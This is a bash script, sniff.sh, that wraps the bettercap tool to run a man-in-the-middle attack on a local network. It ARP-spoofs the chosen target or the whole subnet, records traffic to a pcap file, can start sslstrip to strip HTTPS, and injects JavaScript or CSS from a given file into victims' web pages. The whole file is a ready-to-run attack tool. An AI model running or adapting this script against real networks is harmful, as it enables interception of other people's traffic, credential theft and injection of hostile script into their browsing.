#!/bin/bash
#
# sniff.sh
# Copyright (C) 2016 Dimitris Karakostas <dimit.karakostas@gmail.com>
#
# Distributed under terms of the MIT license.
#

error_checking() {
    command -v bettercap >/dev/null 2>&1 || { echo >&2 "[!] Bettercap is not installed."; exit 1; }
    argument_array=("$@")
    input_file=false
    for i in "${argument_array[@]}"
    do
        if [ "${input_file}" = true ]; then
            if [ -f $i ]; then
                input_file=false
                continue
            else
                echo "[!] Injection file not found."
                exit 1
            fi
        fi
        case $i in
            --strip)
                input_file=false
                ;;
            --injectjs|--injectcss)
                input_file=true
                ;;
            *)
                usage
                exit 1
                ;;
        esac
    done
}

usage() {
    echo "Usage:
    ./sniff.sh <parameter>
where <parameter> is:
    <empty> Run Bettercap as MitM.
    --strip Enable sslstrip.
    --injectjs <filepath> Inject the JS code in the given file.
    --injectcss <filepath> Inject the CSS code in the given file.
"
}

sslstrip() {
    $BASEDIR/strip.sh
}

mitm_sniff() {
    sudo bettercap -I ${INTERFACE} ${TARGET} ${INJECT_JS_FILE} ${INJECT_CSS_FILE} --spoofer ARP -X --sniffer-output capture.pcap | tee -a bettercap.log
}

user_input() {
    DEFAULT_CONNECTION=$(ip -o -f inet addr show | awk '/scope global/ {print $2, $4}' | head -n 1)
    DEFAULT_INTERFACE=$(echo $DEFAULT_CONNECTION | cut -d " " -f 1)
    DEFAULT_SUBNET=$(echo $DEFAULT_CONNECTION | cut -d " " -f 2)

    read -p "Interface ($DEFAULT_INTERFACE): " INTERFACE
    INTERFACE=${INTERFACE:-$DEFAULT_INTERFACE}

    read -p "Target ($DEFAULT_SUBNET): " TARGET
    TARGET=${TARGET:-$DEFAULT_SUBNET}

    if [ "$TARGET" != "$DEFAULT_SUBNET" ];
    then
        TARGET="-T $TARGET"
    fi
}

BASEDIR=$(dirname -- "$(readlink -f -- "${BASH_SOURCE}")")
INJECT_JS_FILE=""
INJECT_CSS_FILE=""

## Check all arguments for validation before beginning attack
error_checking $@

## Get user input for the network arguments
user_input

while [[ $# -ge 0 ]]
do
    var="$1"
    case $var in
        --strip)
            sslstrip &
            ;;
        --injectjs)
            INJECT_JS_FILE="--proxy-module injectjs --js-file $2 "
            shift
            ;;
        --injectcss)
            INJECT_CSS_FILE="--proxy-module injectcss --css-file $2 "
            shift
            ;;
        *)
            break
            ;;
    esac
    shift
done

mitm_sniff
